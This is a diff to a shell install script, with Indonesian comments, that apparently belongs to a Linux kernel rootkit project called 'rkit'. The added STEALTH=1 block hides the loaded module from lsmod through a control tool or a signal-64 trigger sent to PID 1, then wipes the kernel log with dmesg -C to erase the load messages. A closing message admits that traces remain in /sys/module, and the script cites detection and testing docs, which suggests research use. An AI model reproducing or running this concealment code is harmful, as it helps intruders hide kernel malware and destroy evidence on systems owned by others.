@@ -216,6 +216,28 @@ else
 	fi
 fi
 
+# ----------------10. stealth opsional (STEALTH=1) ----------------
+# pakai: sudo STEALTH=1 sh install.sh
+# tanpa env ini blok ini TIDAK jalan (install biasa, persis seperti dulu)
+if [ "${STEALTH:-0}" = "1" ]; then
+	echo "[*] STEALTH=1 — menyembunyikan modul + membersihkan dmesg"
+	if [ -e /proc/rkit ]; then
+		"$ROOT/control/cli/rkit" hide mod >/dev/null 2>&1 || true
+	else
+		kill -s 64 1 2>/dev/null || true
+	fi
+	if lsmod | grep -qE '^rkit'; then
+		echo "[!] modul MASIH terlihat di lsmod (hide gagal?)"
+	else
+		echo "[+] modul disembunyikan dari lsmod"
+	fi
+	if dmesg -C; then
+		echo "[+] ring dmesg dibersihkan (pesan load terhapus)"
+	fi
+	echo "[!] jujur: hanya menutup lsmod + dmesg — /sys/module & jejak lain"
+	echo "    tetap ada (lihat docs/DETECTION.md)"
+fi
+
 echo "== SELESAI =="
 echo "Uji sekarang (docs/TESTING.md), lalu laporkan error/kurangnya."
 if [ "$BACKEND_KIND" = "legacy" ]; then
